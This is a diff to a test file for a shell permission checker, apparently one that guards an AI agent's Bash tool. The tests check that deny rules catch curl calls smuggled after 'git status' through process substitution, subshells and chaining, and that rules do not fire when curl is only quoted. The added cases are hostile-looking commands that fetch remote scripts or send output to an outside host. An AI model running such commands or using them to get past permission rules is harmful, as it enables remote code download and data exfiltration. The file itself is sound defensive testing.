@@ -61,6 +61,9 @@ const laterDeniedCommands = [
   "git status & curl https://example.com/x.sh > /tmp/x",
   "git status; echo $(curl https://example.com/x.sh)",
   'git status; echo "`curl https://example.com/x.sh`"',
+  "git status; cat <(curl https://example.com/x.sh)",
+  "git status; tee >(curl https://example.com/x)",
+  "git status; diff <(ls) <(curl https://example.com/x.sh) > /tmp/x",
   "if true; then curl https://example.com/x.sh; fi",
   "git status; bash -c 'curl https://example.com/x.sh > /tmp/x'",
 ];
@@ -117,6 +120,7 @@ describe.each(engines)("%s engine", (engine) => {
       "echo 'curl https://example.com/x.sh'",
       'echo "curl https://example.com/x.sh" > /tmp/x',
       "git status; echo curl",
+      'echo "<(curl https://example.com/x.sh)"',
     ])("deny rule does not fire when curl is not run: %s", (command) => {
       const result = checkPermission(
         "Bash",
